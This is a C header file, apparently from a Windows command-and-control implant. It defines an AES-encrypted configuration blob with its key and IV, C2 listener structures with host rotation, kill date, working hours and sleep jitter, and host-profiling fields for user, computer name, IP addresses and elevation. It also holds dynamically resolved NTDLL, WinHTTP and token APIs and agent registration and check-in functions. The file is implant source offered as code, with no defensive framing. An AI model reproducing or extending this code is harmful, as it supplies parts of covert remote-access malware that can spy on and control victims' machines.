#pragma once
#include "Common.h"

#define AGENT_MAGIC_VALUE 0x0041153C //allsec in l33t speak.
#define CONFIG_BYTES {0x32,0x0d,0x06,0xf0,0x07,0x85,0x19,0x7d,0x8d,0xd0,0x49,0xf2,0x04,0x89,0xa0,0x65,0x74,0x63,0xb7,0xda,0x2a,0xbd,0x1f,0x2f,0xcf,0x20,0x68,0xaa,0x9e,0x9f,0xf9,0x45,0xa6,0x51,0xf6,0x59,0xa5,0xd2,0xd2,0x8f,0xd9,0xe7,0xb2,0x46,0x21,0x9c,0xd2,0x55,0x82,0x36,0xd8,0xa5,0xb7,0x63,0xd5,0xff,0x1b,0x04,0x22,0xd8,0x73,0xb2,0x22,0x86,0x08,0xb2,0xe5,0xb6,0x56,0x04,0x0a,0x77,0xd6,0xb7,0x74,0xa9,0x2f,0x8f,0x37,0xfc,0x18,0xd4,0x36,0x30,0xa5,0x8a,0xfe,0x33,0x68,0x56,0x9b,0xc1,0x24,0x42,0x1f,0x3e,0x1e,0x8a,0x95,0x00,0xac,0x00,0x20,0x86,0x05,0x32,0x05,0x92,0x1b,0xaf,0xd8,0xb7,0xef,0x29,0x5a,0x06,0x46,0x26,0x17,0x5f,0x55,0xc7,0x02,0x2d,0x85,0x4f,0x53,0x91,0xf4,0x52,0x36,0x0f,0x73,0xec,0x34,0x44,0x4f,0x97,0x13,0x2a,0x01,0xdb,0xfe,0x0e,0x5f,0x52,0x67,0xdc,0xd3,0x92,0x62,0x4e,0x4b,0x59,0x44,0x9f,0x77,0xdc,0x25,0x6c,0x44,0x90,0x38,0x4c,0x35,0xcc,0x35,0x79,0xeb,0x0d,0xcb,0xb3,0xc3,0x58,0xda,0xa9,0x5e,0x54,0x1e,0x32,0x36,0xa1,0x41,0x2b,0x4c,0xf1,0x77,0x80,0xf4,0x5d,0x03,0x85,0xb5,0x08,0x7c,0xa6,0x87,0x7c,0x29,0xb8,0x97,0x9b,0x9a,0xe1,0x68,0x9f,0x55,0x27,0xab,0xb2,0x58,0x68,0xbe,0x57,0x4f,0x62,0xd1,0x3b,0x22,0x00,0x1b,0x72,0x17,0x08,0x86,0x18,0xae,0x5d,0x39,0xb3,0xe6,0x7e,0x3e,0x3f,0xed,0x7e,0x89,0x36,0x35,0x2e,0x57,0xe1,0x14,0x39,0x71,0x08,0x31,0x2e,0x04,0xda,0xb1,0xc7,0x89,0x88,0xba,0xb1,0xb7,0x81,0xfb,0xae,0xc4,0xb9,0x3b,0x6d,0xde,0x57,0x0b,0x51,0x19,0x38,0x83,0xe5,0x0c,0x98,0xa6,0xee,0x2f,0xcd,0xbb,0x65,0xa5,0x0c,0x78,0x2a,0x0e,0x6d,0x8a,0x50,0x00,0xc5,0x93,0xb3,0x30,0x0c,0x3a,0xce,0x87,0x9b,0x22,0x55,0x8c,0xeb,0x6b,0xd8,0xf4,0x73,0xd4,0xba,0x6b,0x30,0xc2,0x7c,0xe0,0x95,0x9b,0xbc,0x25,0x6e,0xec,0x71,0xbf,0x14,0x74,0x58,0x2e,0x33,0x9f,0xd7,0x1b,0xbf,0x37,0xc3,0x21,0x17,0xae,0x64,0x71,0x65,0x96,0x96,0x48,0xbc,0x44,0xd7,0x85,0x60,0x9b,0xfb,0xa1,0x17,0x82,0x9e,0x7c,0xd6,0x25,0xc0,0xdc,0x24,0x4d,0xc9,0xfb,0x8c,0xb9,0x40,0xe1,0xa5,0x1a,0xf9,0x90,0x77,0xec,0xdb,0x0d,0x71,0xcb,0x1f,0x42,0xdc,0x10,0xda,0xc8,0xa2,0x91,0x46,0xf8,0x89,0xe0,0x0d,0xb7,0x3d,0x24,0xb7,0x98,0x64,0x22,0xdf,0x86,0x6e,0x42,0x0b,0xfe,0x8a,0x24,0xfc,0x44,0xc3,0xcf,0x00,0xc3,0x9e,0x8b,0xcf,0x2b,0x56,0x48,0x75,0x5b,0x29,0x4c,0x27,0x6f,0xfe,0x45,0x21,0xad,0xf9,0x78,0xdd,0x3c,0x00,0xe0,0x8b,0x86,0x94,0x8d,0x54,0x38,0xab,0x20,0xa5,0x45,0x7c,0xf1,0x6d,0x7e,0x90,0xf7,0xa1,0xb1,0xbf,0xfe,0xce,0x54,0x5e,0xb1,0x9d,0xf5,0xd2,0x5b,0x52,0xd9,0x1b,0x0f,0x98,0x1f,0x07,0x3c,0x42,0x55,0x21,0x25,0x43,0x4d,0x02,0x8f,0xaf,0x73,0x20,0x70,0x81,0xd7,0xef,0xf0,0xd4,0xb6,0xb1,0x8b,0xbe,0xb2,0x2d,0xaa,0x2b,0x33,0x34,0xd9,0x83,0xba,0x0c,0x7c,0x0c,0xf1,0x3c,0xe4,0x7d,0xe3,0xf3,0xa9,0xd8,0xdc,0xac,0x69,0x6b,0x70,0xc5,0x9e,0x11,0x17,0x82,0x04,0xf9,0x2c,0x2a,0xee,0xbc,0x2a,0xfb,0x39,0x73,0x05,0x02,0xef,0x2f,0x31,0x57,0x21,0x18,0x4c,0x91,0x17,0xf7,0x09,0x47,0xa7,0xfb,0xc0,0x8d,0x09,0x6f,0xfd,0x0b,0xfa,0x9f,0xb6,0xdb,0xfb,0x16,0xaf,0x6e,0xdd,0xbe,0x6f,0x6d,0x69,0xbb,0x5d,0xbf,0xee,0x6e,0xba,0xe1,0x6e,0x03,0x4b,0x54,0x8a,0x05,0x39,0xf2,0xe0,0xca,0xf9,0xcf,0x33,0x84,0xfd,0x8f,0x0b,0xa8,0x3f,0x46,0x15,0x1a,0x0e,0x74,0x0d,0xca,0x45,0xe7,0x81,0xb8,0x92,0xcd,0x9e,0x00,0xf2,0x99,0x9c,0x14,0x5b,0x47,0x95,0x19,0xb5,0x29,0xea,0x13,0xd4,0x5b,0x20,0x18,0xad,0xcd,0x04,0x3a,0x94,0xa6,0x3c,0x5d,0x72,0x43,0x4c,0x1f,0x3a,0x38,0x33,0xce,0x28,0x9b,0x08,0x64,0x0b,0xc7,0x61,0x82,0xf0,0x8a,0x47,0xf3,0x84,0x17,0x07,0x25,0x50,0xd5,0x15,0x46,0x3e,0x2a,0x64,0x26,0xdb,0xd5,0x7a,0x32,0x1d,0x43,0x80,0x57,0x13,0x15,0x2c,0xa6,0x13,0xc4,0xe0,0xae,0xd2,0xad,0x60,0x2c,0x85,0x34,0x0b,0xe4,0xf1,0x35,0x6a,0xfa,0xa7,0xbd,0xc5,0x97}
#define CONFIG_KEY_BYTES {0xbb,0xe6,0x9e,0x36,0x4e,0xed,0x89,0x30,0x6e,0xcf,0x4f,0x66,0xd2,0x9a,0x02,0x0d,0xd3,0xb3,0x1e,0x2d,0x20,0x6b,0x26,0xcd,0x1c,0x65,0x02,0xfb,0x61,0x82,0x49,0x31}
#define CONFIG_IV_BYTES {0x0b,0x35,0x63,0x6b,0x5a,0xcd,0x61,0xfd,0x95,0x33,0x17,0xca,0x06,0x12,0x47,0xc8}

struct Packges; // forward declaration so it can be included in the packages.h header file w/o having to include packages.h here Causing cyclic dependencies.

typedef struct _ContextInfo {
	DWORD dwMajorVersion;
	DWORD dwMinorVersion;
	DWORD dwBuildNumber;
	DWORD dwPlatformId;
	WORD   wServicePackMajor;
	WORD   wServicePackMinor;
	WORD   wSuiteMask;
	BYTE  wProductType;
	LPSTR UserName;
	LPSTR ComputerName;
	LPSTR IPAddress[10][5];
	DWORD PID;
	DWORD TID;
	DWORD PPID;
	WORD OS_Arch;
	WORD Process_Arch;
	BOOL Elevated;
} ContextInfo, *PContextInfo ;

typedef struct _HostData {
	LPWSTR Host;
	INT Port;
	BOOL Alive;
	struct _HostData* Next;
} HostData, * pHostData;

typedef struct _ListenerConfig {
	DWORD HostRotation;
	pHostData Hosts;
	pHostData CurrentHost;
	UINT NumHosts;
	DWORD Port;
	BOOL Secure;
	LPWSTR Method;
	LPWSTR* Headers;
	LPWSTR UserAgent;

} ListenerConfig, *PListenerConfig;

//TODO FINISH ADDING LISTENER / AGENT CONFIG DATA/
typedef struct _AgentConfig {

	UINT64 KillDate;
	UINT32 WorkingHours;
	UINT32 SleepTime;
	UINT32 SleepJitter;
	ListenerConfig listenerConfig;

} AgentConfig, *PAgentConfig;

//TODO clean up this structure.
//I.E. make strcutrues for module hanldes, function pointers, etc. and include them in this parent structure rather than all directly.
typedef struct _Agent {


	//enumeration apis
	//NTDLL APIS
	t_RtlGetVersion pRtlGetVersion;
	t_NtClose pNtClose;
	t_NtOpenProcessToken pNtOpenProcessToken;
	t_NtOpenThreadToken pNtOpenThreadToken;
	t_NtQueryInformationToken pNtQueryInformationToken;
	t_RtlAllocateHeap pRtlAllocateHeap;
	t_RtlReAllocateHeap pRtlReAllocateHeap;
	t_RtlRandomEx pRtlRandomEx;
	t_NtGetTickCount pNtGetTickCount;

	
	//KERNEL32 APIS
	t_GetComputerNameExA pGetComputerNameExA;

	//ADVAPI APIS
	HMODULE hAdvapi32;
	t_GetUserNameA pGetUserNameA;

	//USER32 APIS
	HMODULE hUser32;
	t_GetSystemMetrics pGetSystemMetrics;

	//IPHLPAPI APIS'
	HMODULE hIphlpapi;
	t_GetAdaptersInfo pGetAdaptersInfo;

	//http request APIS
	//WINHTTP APIS
	HMODULE hWinHttp;
	t_WinHttpOpen pWinHttpOpen;
	t_WinHttpConnect pWinHttpConnect;
	t_WinHttpOpenRequest pWinHttpOpenRequest;
	t_WinHttpSendRequest pWinHttpSendRequest;
	t_WinHttpReceiveResponse pWinHttpReceiveResponse;
	t_WinHttpQueryHeaders pWinHttpQueryHeaders;
	t_WinHttpAddRequestHeaders pWinHttpAddRequestHeaders;
	t_WinHttpSetOption pWinHttpSetOption;

	//agent metadata
	UINT32 AgentID;
	char EndPoint[256];

	//agent configuration
	PAgentConfig config;

	//current context info
	PContextInfo Context;


	P_INT_TEB pTeb;

	//crypto info.
	BYTE* AESKey;
	ULONG AESKeySize;
	BYTE* EncryptedAESKey;
	ULONG EncryptedAESKeySize;
	BYTE* IV;
	ULONG IVSize;
	BYTE* EncryptedIV;
	ULONG EncryptedIVSize;

	struct _Package* packages;
	



}Agent, * pAgent;



enum Agent_Operations {
	INITIALIZE_AGENT = 0,
	EXIT_AGENT,
	SLEEP_AGENT,
	GET_AGENT_JOB,
	CHECKIN_AGENT,
};


INT init_agent(pAgent agent);
INT RegisterAgent(pAgent agent);
BOOL SendRegisterRequest(pAgent agent, VOID* Buffer, ULONG BufferLength);
void AgentMain();
INT ParseConfig(pAgent agent);